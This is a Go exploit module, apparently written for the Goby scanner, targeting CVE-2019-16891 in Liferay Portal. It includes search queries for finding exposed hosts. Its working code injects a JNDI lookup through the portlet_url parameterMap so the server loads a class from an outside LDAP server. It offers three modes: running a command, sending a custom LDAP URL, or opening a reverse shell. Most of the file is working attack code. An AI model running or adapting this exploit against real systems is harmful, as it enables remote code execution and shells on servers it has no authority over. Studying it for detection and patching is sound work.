package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Liferay Portal RCE (CVE-2019-16891)",
    "Description": "<p>Liferay Portal is a J2EE-based portal solution developed by American Liferay Company. The solution uses technologies such as EJB and JMS, and can be used as Web publishing and shared workspace, enterprise collaboration platform, social network, etc.</p><p>A code issue vulnerability exists in Liferay Portal CE version 6.2.5. This vulnerability stems from improper design or implementation problems in the code development process of network systems or products.</p>",
    "Product": "Liferay",
    "Homepage": "http://www.liferay.com/",
    "DisclosureDate": "2023-01-03",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"Powered by Liferay Portal\" || header=\"Liferay Portal\" || banner=\"Liferay Portal\" || header=\"guest_language_id=\" || banner=\"guest_language_id=\" || body=\"Liferay.AUI\" || body=\"Liferay.currentURL\"",
    "GobyQuery": "body=\"Powered by Liferay Portal\" || header=\"Liferay Portal\" || banner=\"Liferay Portal\" || header=\"guest_language_id=\" || banner=\"guest_language_id=\" || body=\"Liferay.AUI\" || body=\"Liferay.currentURL\"",
    "Level": "3",
    "Impact": "<p>A code issue vulnerability exists in Liferay Portal CE version 6.2.5. This vulnerability stems from improper design or implementation problems in the code development process of network systems or products.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage: <a href=\"https://www.liferay.com\">https://www.liferay.com</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,custom,reverse",
            "show": ""
        },
        {
            "name": "ldap",
            "type": "input",
            "value": "ldap://127.0.0.1:1389/Exp",
            "show": "attackType=custom"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2019-16891"
    ],
    "CNNVD": [
        "CNNVD-201910-185"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Liferay Portal 远程代码执行漏洞（CVE-2019-16891）",
            "Product": "Liferay",
            "Description": "<p>Liferay Portal是美国Liferay公司的一套基于J2EE的门户解决方案。该方案使用了EJB以及JMS等技术，并可作为Web发布和共享工作区、企业协作平台、社交网络等。<br></p><p>Liferay Portal CE 6.2.5版本中存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href=\"https://www.liferay.com\">https://www.liferay.com</a><br></p>",
            "Impact": "<p>Liferay Portal CE 6.2.5版本中存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Liferay Portal RCE (CVE-2019-16891)",
            "Product": "Liferay",
            "Description": "<p>Liferay Portal is a J2EE-based portal solution developed by American Liferay Company. The solution uses technologies such as EJB and JMS, and can be used as Web publishing and shared workspace, enterprise collaboration platform, social network, etc.<br></p><p>A code issue vulnerability exists in Liferay Portal CE version 6.2.5. This vulnerability stems from improper design or implementation problems in the code development process of network systems or products.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage: <a href=\"https://www.liferay.com\">https://www.liferay.com</a><br></p>",
            "Impact": "<p>A code issue vulnerability exists in Liferay Portal CE version 6.2.5. This vulnerability stems from improper design or implementation problems in the code development process of network systems or products.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10706"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodLDAPCheckURL("U", checkStr)

			uri := fmt.Sprintf("/c/portal/portlet_url?parameterMap={\"javaClass\":\"org.hibernate.jmx.StatisticsService\",\"sessionFactoryJNDIName\":\"%s\"}", checkUrl)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 400 {
				return godclient.PullExists(checkStr, time.Second*10)

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			jndiUrl := ""
			var waitSessionCh chan string
			if attackType != "cmd" && attackType != "custom" && attackType != "reverse" {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			} else if attackType == "cmd" {
        jndiUrl = "ldap://" + godclient.GetGodServerHost() + "/A4"
			} else if attackType == "custom" {
				jndiUrl = goutils.B2S(ss.Params["ldap"])
			} else if attackType == "reverse" {
				waitSessionCh = make(chan string)
				// 构建反弹Shell LDAP
				if rp, err := godclient.WaitSession("reverse_java", waitSessionCh); err != nil || len(rp) == 0 {
					expResult.Output = err.Error()
					return expResult
				} else {
					jndiUrl = "ldap://" + godclient.GetGodServerHost() + "/E" + godclient.GetKey() + rp
				}
			}
			uri := fmt.Sprintf("/c/portal/portlet_url?parameterMap={\"javaClass\":\"org.hibernate.jmx.StatisticsService\",\"sessionFactoryJNDIName\":\"%s\"}", jndiUrl)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if attackType == "cmd" {
				cfg.Header.Store("cmd", goutils.B2S(ss.Params["cmd"]))
			}
			rsp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil && attackType != "reverse" {
				expResult.Output = err.Error()
				expResult.Success = true
			}
			if attackType == "cmd" {
				if rsp.StatusCode == 200 {
					expResult.Output = rsp.Utf8Html
					expResult.Success = true
				} else {
					expResult.Output = "执行失败，目标环境可能对 JNDI 做了限制"
					expResult.Success = false
				}
			} else if attackType == "custom" {
				expResult.Output = "自定义 LDAP 已发送，请检查自定义 LDAP 服务请求"
				expResult.Success = true
			} else if attackType == "reverse" {
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						return expResult
					}
				case <-time.After(time.Second * 10):
					expResult.Success = false
					expResult.Output = "请确认目标环境，是否支持出网利用"
					return expResult
				}
			}
			return expResult
		},
	))
}
